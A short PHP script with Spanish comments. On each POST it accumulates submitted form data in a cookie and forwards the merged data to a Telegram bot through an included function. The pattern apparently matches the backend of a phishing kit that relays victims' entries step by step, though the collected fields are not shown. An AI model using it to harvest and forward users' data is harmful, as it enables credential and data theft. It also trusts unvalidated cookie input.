<?php
require_once('bot_telegram.php');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Recuperar los datos de la cookie
    if (isset($_COOKIE['userData'])) {
        // Deserializar el JSON en un array
        $cookieData = json_decode($_COOKIE['userData'], true);

        // Recuperar los nuevos datos enviados en la solicitud POST
        $newData = $_POST['data'];

        // Concatenar los nuevos datos con los datos de la cookie
        $completeData = array_merge($cookieData, $newData);

        $jsonData = json_encode($completeData);

        setcookie('userData', $jsonData, time() + (86400 * 30), "/");

        // Llamar a la función editarMensajeTelegram con los datos concatenados
        $result = editarMensajeTelegram($completeData);

        if ($result) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['success' => false]);
        }
    } else {
        echo json_encode(['success' => false, 'error' => 'Cookie no encontrada']);
    }
} else {
    echo json_encode(['success' => false, 'error' => 'Método no permitido']);
}
?>